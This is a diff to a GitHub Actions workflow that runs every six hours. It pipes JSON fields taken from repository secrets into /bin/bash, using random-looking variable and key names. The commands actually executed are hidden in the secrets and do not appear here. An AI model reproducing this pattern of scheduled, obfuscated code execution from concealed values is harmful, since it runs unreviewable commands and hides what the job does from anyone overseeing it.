@@ -1,8 +1,9 @@
 name: yuumbrella
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '57 1/6 * * *'
+    - cron: '36 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -10,14 +11,15 @@ jobs:
       - uses: actions/checkout@v4
       - name: yuumbrella
         env:
-          fcp15120: ${{ secrets.fcp15120 }}
+          mahqk55458: ${{ secrets.mahqk55458 }}
         run: |
-          echo $fcp15120 | jq -r .qnaze40318 | /bin/bash
-          echo $o20392 | jq -r .hs3 | /bin/bash
-          echo $rsuwj91688 | jq -r .b3231 | /bin/bash
-          echo $ttksq5 | jq -r .pey93359 | /bin/bash
-          echo $nlgv8 | jq -r .xn8 | /bin/bash
-          echo $ze998 | jq -r .kvy071 | /bin/bash
-          echo $v180 | jq -r .blzc53464 | /bin/bash
-          echo $ncpyd09 | jq -r .g9 | /bin/bash
+          echo $mahqk55458 | jq -r .tn34406 | /bin/bash
+          echo $ntdub5 | jq -r .zxz897 | /bin/bash
+          echo $sgc36 | jq -r .kzfov9 | /bin/bash
+          echo $ltcm593 | jq -r .fso99773 | /bin/bash
+          echo $srkl61790 | jq -r .gt86 | /bin/bash
+          echo $ivqh7 | jq -r .df485 | /bin/bash
+          echo $ff5408 | jq -r .tk12469 | /bin/bash
+          echo $dvlwe13175 | jq -r .zjfxc41745 | /bin/bash
+          echo $umvh34531 | jq -r .qff25479 | /bin/bash
 
